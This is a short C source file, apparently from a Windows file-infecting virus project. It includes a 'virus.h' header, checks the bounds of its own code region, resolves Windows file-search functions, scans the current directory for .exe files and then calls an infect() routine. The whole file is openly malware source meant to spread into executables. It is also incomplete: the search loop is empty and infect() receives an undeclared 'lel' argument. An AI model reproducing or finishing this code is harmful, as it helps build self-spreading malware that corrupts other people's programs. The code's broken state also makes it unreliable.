#include "virus.h"

int run(void) {
  data_t data;

  assert(code_begin < code_end);
  assert((void*)run >= (void*)code_begin &&
         (void*)run < (void*)code_end);
  
  if (init_data(&data, (void*)code_begin, (void*)code_end, (uint8_t*)run - (uint8_t*)code_begin) != 0) {
    return 1;
  }
  WIN32_FIND_DATAA findData;
  HANDLE hFind;
  const char searchPattern[8] = { '.', '/', '*', '.', 'e', 'x', 'e', 0 };

  memzero(&findData, sizeof(WIN32_FIND_DATAA));
  hFind = data.functions.findFirstFileA(searchPattern, &findData);
  if (hFind == INVALID_HANDLE_VALUE) {
    return 2;
  }
  do {

  } while (data.functions.findNextFileA(hFind, &findData));
  data.functions.findClose(hFind);

  return infect(lel, &data);
}
